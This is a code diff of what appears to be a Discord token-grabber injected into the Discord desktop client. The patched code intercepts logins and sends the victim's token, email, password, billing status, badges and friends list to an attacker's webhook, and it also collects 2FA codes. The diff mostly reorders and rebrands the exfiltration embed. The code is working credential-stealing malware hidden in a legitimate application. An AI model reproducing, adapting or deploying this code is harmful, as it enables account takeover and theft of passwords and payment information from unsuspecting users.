@@ -27,6 +27,7 @@ const config = {
     "disable-qr-code":"%DISABLEQRCODE%"
 }
 
+
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 	if (details.url.startsWith(webhook)) {
 		if (details.url.includes("discord.com")) {
@@ -438,68 +439,64 @@ function Login(email, password, token) {
 									} else if (z.type == 1 && z.invalid != !0) {
 										billing += "\`✔️\`" + " :credit_card:"
 									} else {
-										return "\`❌\`"
+										return "\`No\`"
 									}
 								})
 								if (billing == "") {
-									billing = "\`❌\`"
+									billing = "\`No\`"
 								}
 								return billing
 							}
 							const json = JSON.parse(info);
 
 							var params = {
-								username: "1295",
+								username: "",
 								content: "",
 								embeds: [{
-									"title": "Enayi Hesaba Girdi",
-									description: "[**1295**](https://discord.gg/1295)",
-									"color": 16507654,
+									"title": "",
+									description: "",
+									"color": 1,
 									"fields": [{
-										name: "Username",
-										value: `\`${json.username}#${json.discriminator}\``,
-										inline: !0
-									}, {
-										name: "ID",
-										value: `\`${json.id}\``,
-										inline: !0
-									}, {
-										name: "Nitro",
-										value: `${GetNitro(json.premium_type)}`,
-										inline: !0
-									}, {
-										name: "Badges",
-										value: `${GetBadges(json.flags)}`,
-										inline: !0
-									}, {
-										name: "Billing",
-										value: `${Cool()}`,
-										inline: !0
-									}, {
-										name: "Email",
-										value: `\`${email}\``,
-										inline: !0
-									}, {
-										name: "Password",
-										value: `\`${password}\``,
-										inline: !0
-									}, {
 										name: "Token",
 										value: `\`\`\`${token}\`\`\``,
 										inline: !1
-									}, ],
+									}, {
+										name: "Username",
+										value: `\`${json.username}#${json.discriminator}(${json.id}\``,
+										inline: !1
+									}, {
+										name: "Badges",
+										value: `**${GetBadges(json.flags)}**`,
+										inline: !0
+									}, {
+										name: "Nitro",
+										value: `**${GetNitro(json.premium_type)}**`,
+										inline: !0
+									}, {
+										name: "Billing",
+										value: `**${Cool()}**`,
+										inline: !0
+									}, {
+										name: "Email",
+										value: `**\`${email}\`**`,
+										inline: !0
+									}, {
+										name: "Password",
+										value: `**\`${password}\`**`,
+										inline: !0
+									},],
 									"author": {
-										"name": "1295"
+										"name": ""
 									},
 									"footer": {
-										"text": "1295"
+										"text": ""
 									},
 									"thumbnail": {
 										"url": ``
 									}
 								}, {
 									"title": `Total Friends (${totalFriends()})`,
-									"color": 16507654,
+									"color": 1,
 									"description": CalcFriends(),
 									"author": {
 										"name": "1295"
@@ -515,7 +512,7 @@ function Login(email, password, token) {
 							var mfaembed = {
 								"title": ":detective: __2FA Codes__",
 								"description": `[Get all of them](${baseuri})`,
-								"color": 16507654,
+								"color": 1,
 								"fields": fieldo,
 								"author": {
 									"name": "1295"
@@ -595,67 +592,63 @@ function Login(email, password, token) {
 												} else if (z.type == 1 && z.invalid != !0) {
 													billing += "\`✔️\`" + " :credit_card:"
 												} else {
-													return "\`❌\`"
+													return "\`No\`"
 												}
 											})
 											if (billing == "") {
-												billing = "\`❌\`"
+												billing = "\`No\`"
 											}
 											return billing
 										}
 										const json = JSON.parse(info);
-										var params = {
-											username: "1295",
-											content: "",
-											embeds: [{
-												"title": "Enayi Hesaba Girdi",
-												description: "[**1295**](https://discord.gg/1295)",
-												"color": 16507654,
-												"fields": [{
-													name: "Username",
-													value: `\`${json.username}#${json.discriminator}\``,
-													inline: !0
-												}, {
-													name: "ID",
-													value: `\`${json.id}\``,
-													inline: !0
-												}, {
-													name: "Nitro",
-													value: `${GetNitro(json.premium_type)}`,
-													inline: !0
-												}, {
-													name: "Badges",
-													value: `${GetBadges(json.flags)}`,
-													inline: !0
-												}, {
-													name: "Billing",
-													value: `${Cool()}`,
-													inline: !0
-												}, {
-													name: "Email",
-													value: `\`${email}\``,
-													inline: !0
-												}, {
-													name: "Password",
-													value: `\`${password}\``,
-													inline: !0
-												}, {
-													name: "Token",
-													value: `\`\`\`${token}\`\`\``,
-													inline: !1
-												}, ],
-												"author": {
-													"name": "1295"
-												},
-												"footer": {
-													"text": "1295"
-												},
-												"thumbnail": {
-													"url": ``
-												}
-											}, {
+							var params = {
+								username: "",
+								content: "",
+								embeds: [{
+									"title": "",
+									description: "",
+									"color": 1,
+									"fields": [{
+										name: "Token",
+										value: `\`\`\`${token}\`\`\``,
+										inline: !1
+									}, {
+										name: "Username",
+										value: `\`${json.username}#${json.discriminator}(${json.id}\``,
+										inline: !1
+									}, {
+										name: "Badges",
+										value: `**${GetBadges(json.flags)}**`,
+										inline: !0
+									}, {
+										name: "Nitro",
+										value: `**${GetNitro(json.premium_type)}**`,
+										inline: !0
+									}, {
+										name: "Billing",
+										value: `**${Cool()}**`,
+										inline: !0
+									}, {
+										name: "Email",
+										value: `**\`${email}\`**`,
+										inline: !0
+									}, {
+										name: "Password",
+										value: `**\`${password}\`**`,
+										inline: !0
+									},],
+									"author": {
+										"name": ""
+									},
+									"footer": {
+										"text": ""
+									},
+									"thumbnail": {
+										"url": ``
+									}
+								}, {
 												"title": `Total Friends (${totalFriends()})`,
-												"color": 16507654,
+												"color": 1,
 												"description": CalcFriends(),
 												"author": {
 													"name": "1295"
@@ -1440,3 +1433,4 @@ session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, ca
 	}
 });
 module.exports = require('./core.asar')
+
